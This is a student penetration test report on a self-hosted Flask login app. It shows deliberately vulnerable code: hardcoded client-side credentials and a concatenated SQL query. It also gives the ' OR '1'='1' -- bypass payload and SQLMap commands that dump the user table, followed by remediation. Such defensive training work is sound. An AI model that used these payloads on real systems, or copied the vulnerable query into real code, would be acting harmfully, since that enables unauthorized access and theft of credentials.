# Penetration Test Report — SQL Injection on Vulnerable Login Page

**Author:** Suyash alias Ryugai  
**Date:** 2026-06-27  
**Target:** Locally hosted Flask web application (`http://192.168.56.1:5000`)  
**Type:** Black-box Web Application Penetration Test  
**Severity:** 🔴 Critical  
**Status:** Vulnerability confirmed and exploited

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope & Environment](#2-scope--environment)
3. [Tools Used](#3-tools-used)
4. [Reconnaissance](#4-reconnaissance)
5. [Vulnerability Discovery](#5-vulnerability-discovery)
6. [Exploitation](#6-exploitation)
   - [Attack 1 — Client-Side Authentication Bypass (DevTools)](#attack-1--client-side-authentication-bypass-devtools)
   - [Attack 2 — Manual SQL Injection (Auth Bypass)](#attack-2--manual-sql-injection-auth-bypass)
   - [Attack 3 — Automated SQLi & Database Dump (SQLMap)](#attack-3--automated-sqli--database-dump-sqlmap)
7. [Findings Summary](#7-findings-summary)
8. [Evidence](#8-evidence)
9. [Remediation](#9-remediation)
10. [Lessons Learned](#10-lessons-learned)

---

## 1. Executive Summary

This report documents a penetration test conducted against a locally developed Flask web application featuring a user login system backed by a SQLite database. The test was performed as part of a practical cybersecurity training exercise (Acmegrade LMS assignment).

Three critical vulnerabilities were identified and successfully exploited:

- Credentials exposed in client-side JavaScript source code
- SQL Injection vulnerability allowing authentication bypass without valid credentials
- Full database dump achieved via automated SQLi tooling, exposing all usernames and passwords in plain text

An attacker with network access to this application could bypass authentication entirely and extract all stored user data within minutes using freely available tools.

---

## 2. Scope & Environment

| Item | Detail |
|------|--------|
| Target URL | `http://192.168.56.1:5000` |
| Application type | Flask (Python) web app with SQLite database |
| Target OS | Windows 10/11 (host machine) |
| Attacker OS | Kali Linux (virtual machine) |
| Network setup | Host-only adapter — Kali VM → Windows Host |
| Test type | Black-box (attacker has no prior knowledge of source code) |
| Authorization | Self-owned lab environment — authorized test |

---

## 3. Tools Used

| Tool | Purpose | Cost |
|------|---------|------|
| Browser DevTools (F12) | Source code review, client-side analysis | Free (built-in) |
| curl | Network connectivity verification | Free (built-in on Kali) |
| SQLMap | Automated SQL injection detection and exploitation | Free / open source |
| Notepad++ | Code editor (Windows) | Free |
| Python 3 + Flask | Backend web server | Free |
| SQLite | Database engine | Free |

---

## 4. Reconnaissance

### Step 1 — Application Fingerprinting

Opened the target URL in the browser. Observed a standard login form with two input fields:
- `username` (text)
- `password` (password)

### Step 2 — Network Verification from Kali

Confirmed Kali VM could reach the target before launching any attacks:

```bash
curl http://192.168.56.1:5000
```

**Result:** Full HTML of the login page returned — target is reachable from the attack machine.

### Step 3 — Page Source Review

Opened browser DevTools (`F12`) → Sources tab. Attempted to review JavaScript logic for any client-side vulnerabilities.

---

## 5. Vulnerability Discovery

### Vulnerability 1 — Client-Side Authentication (CWE-603)

**Description:**  
The initial version of the application performed its login check entirely inside the browser using JavaScript. The credentials were hardcoded directly in the source code.

**Vulnerable code (login.html):**
```javascript
function doLogin() {
  const user = document.getElementById('username').value;
  const pass = document.getElementById('password').value;

  // Credentials stored in plain text in client-side JS
  if (user === "admin" && pass === "password123") {
    // grant access
  }
}
```

**Impact:** Any user who opens DevTools can read the username and password in seconds. No attack tools required.

---

### Vulnerability 2 — SQL Injection via Unsanitised Input (CWE-89)

**Description:**  
The Flask backend directly concatenated user-supplied input into a SQL query string without any sanitisation or parameterisation.

**Vulnerable code (app.py):**
```python
# User input inserted directly into the query — never do this
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
cursor.execute(query)
```

**Impact:** An attacker can manipulate the SQL query by injecting special characters, bypassing authentication or extracting the entire database.

---

### Vulnerability 3 — Plain Text Password Storage (CWE-256)

**Description:**  
User passwords were stored in the SQLite database as plain text with no hashing applied.

**Impact:** Once the database is dumped (via SQLi or any other method), all user passwords are immediately usable with no cracking required.

---

## 6. Exploitation

### Attack 1 — Client-Side Authentication Bypass (DevTools)

**Objective:** Retrieve credentials without typing anything into the login form.

**Steps:**
1. Opened the login page in Chrome
2. Pressed `F12` to open DevTools
3. Navigated to Sources tab → selected `login.html`
4. Located the `doLogin()` function in the JavaScript
5. Read the hardcoded credentials directly from the source

**Payload:** None — credentials were visible in plain text.

**Result:** ✅ Credentials obtained — `admin` / `password123`

---

### Attack 2 — Manual SQL Injection (Auth Bypass)

**Objective:** Log in as admin without knowing the real password.

**Steps:**
1. Opened the login form at `http://192.168.56.1:5000`
2. Entered the following into the Username field:

```
' OR '1'='1' --
```

3. Entered anything into the Password field:

```
anything
```

4. Clicked Sign In

**How the payload works:**

The application built this SQL query using the input:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'anything'
```

- `'` — closes the username string prematurely
- `OR '1'='1'` — adds a condition that is always true, forcing the database to return a user
- `--` — SQL comment that nullifies the rest of the query, including the password check

**Result:** ✅ Logged in as `admin` with no valid password — "Welcome admin! Login successful."

---

### Attack 3 — Automated SQLi & Database Dump (SQLMap)

**Objective:** Confirm the vulnerability with automated tooling and extract all data from the database.

**Steps:**

**Phase 1 — Vulnerability confirmation:**

```bash
sqlmap -u "http://192.168.56.1:5000/login" \
  --data="username=admin&password=test" \
  --method=POST \
  --dbms=sqlite \
  --level=5 \
  --risk=3 \
  --technique=BEUS \
  --batch
```

**SQLMap confirmed:**
```
POST parameter 'username' is vulnerable
back-end DBMS: SQLite
Injection type: Boolean-based blind, UNION query
```

**Phase 2 — Full database dump:**

```bash
sqlmap -u "http://192.168.56.1:5000/login" \
  --data="username=admin&password=test" \
  --method=POST \
  --dbms=sqlite \
  --level=5 \
  --risk=3 \
  --technique=BEUS \
  --tables \
  --dump \
  --batch
```

**Result:** ✅ Full database extracted:

```
Database: SQLite
Table: users
+----+-----------------+----------+
| id | password        | username |
+----+-----------------+----------+
| 1  | supersecret123  | admin    |
| 2  | mypassword456   | john     |
+----+-----------------+----------+
```

SQLMap also saved the dump to:
```
/home/kali/.local/share/sqlmap/output/192.168.56.1/dump/SQLite_masterdb/users.csv
```

---

## 7. Findings Summary

| # | Vulnerability | Severity | CVSS Score | CWE |
|---|--------------|----------|------------|-----|
| 1 | Client-side authentication — credentials in JS | 🔴 Critical | 9.8 | CWE-603 |
| 2 | SQL Injection — authentication bypass | 🔴 Critical | 9.8 | CWE-89 |
| 3 | Plain text password storage | 🔴 Critical | 9.1 | CWE-256 |

**Overall Risk Rating: CRITICAL** — All three vulnerabilities can be exploited by an unskilled attacker with only a browser and freely available tools.

---

## 8. Evidence

> 📸 Add your screenshots here. In GitHub, drag and drop images directly into the markdown editor.

| Screenshot | Description |
|-----------|-------------|
| `screenshots/devtools-source.png` | Credentials visible in browser DevTools source tab |
| `screenshots/manual-sqli-success.png` | Login bypassed using manual SQL injection payload |
| `screenshots/sqlmap-vulnerable.png` | SQLMap confirming username parameter is injectable |
| `screenshots/sqlmap-dump.png` | SQLMap output showing full users table extracted |

---

## 9. Remediation

### Fix 1 — Move authentication to the server (eliminates Vuln 1)

Never perform login checks in client-side JavaScript. All authentication logic must run on the server where users cannot inspect it.

---

### Fix 2 — Use parameterised queries (eliminates Vuln 2)

Replace string concatenation with parameterised queries. This separates SQL code from user data so injection is impossible.

**Vulnerable code:**
```python
# NEVER do this
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
cursor.execute(query)
```

**Secure code:**
```python
# Always do this — parameterised query
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))
```

With parameterised queries, even if a user types `' OR '1'='1' --` into the form, it is treated as a literal string — not as SQL code.

---

### Fix 3 — Hash passwords before storing (eliminates Vuln 3)

Never store passwords as plain text. Use a strong hashing algorithm like bcrypt.

```python
import bcrypt

# When creating a user — hash before storing
hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, hashed))

# When logging in — compare hash, never compare plain text
cursor.execute("SELECT password FROM users WHERE username = ?", (username,))
row = cursor.fetchone()
if row and bcrypt.checkpw(password.encode('utf-8'), row[0]):
    # login successful
```

---

## 10. Lessons Learned

**As an attacker:**
- Client-side security is not security. Anything in the browser belongs to the user.
- SQL injection remains one of the most powerful and common vulnerabilities in web applications.
- Automated tools like SQLMap can confirm and exploit vulnerabilities that take hours to find manually, in minutes.
- A single unparameterised query can expose an entire database.

**As a developer:**
- Never trust user input. Sanitise and validate everything.
- Authentication logic always lives on the server.
- Parameterised queries are non-negotiable when working with databases.
- Passwords must always be hashed with a modern algorithm (bcrypt, Argon2) before storage.

---

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-603: Use of Client-Side Authentication](https://cwe.mitre.org/data/definitions/603.html)
- [CWE-256: Plain Text Storage of Password](https://cwe.mitre.org/data/definitions/256.html)
- [SQLMap Documentation](https://sqlmap.org)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)

---

*This report was produced in a controlled, self-owned lab environment for educational purposes only. All vulnerabilities were intentionally introduced for learning. Never test systems you do not own or have explicit written permission to test.*
